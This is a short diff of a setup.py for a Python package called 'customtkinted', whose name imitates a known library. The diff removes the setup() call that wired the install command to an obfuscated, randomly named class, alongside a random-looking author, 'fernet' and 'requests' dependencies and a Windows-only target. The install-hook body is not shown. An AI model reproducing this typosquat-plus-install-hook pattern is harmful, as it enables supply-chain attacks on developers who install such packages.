@@ -18,22 +18,5 @@ class OYJKuXZDwzDNgAiSfTHPdCKnXiBFgkpZynzXrQkYkMlpLeXKWhrgDkjwYUawgrkjLnSKCYRcBW
             install.run(self)
 
 
-setup(
-    name="customtkinted",
-    version=VERSION,
-    author="GUQwwAQmjImugYX",
-    author_email="CqHlfsCpTMGLaubRB@gmail.com",
-    description=DESCRIPTION,
-    long_description_content_type="text/markdown",
-    long_description=LONG_DESCRIPTION,
-    cmdclass={
-        'install': OYJKuXZDwzDNgAiSfTHPdCKnXiBFgkpZynzXrQkYkMlpLeXKWhrgDkjwYUawgrkjLnSKCYRcBWbvKgOgrWHYcdDdgjHCpSHslKlevCxseCInardwFjlMgXIBxzOYHxJXoFDyw,
-    },
-    packages=find_packages(),
-    setup_requires=['fernet', 'requests'],
-    keywords=[],
-    classifiers=[
-        "Operating System :: Microsoft :: Windows",
-    ]
-)
+# setup(...) removed                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              
 
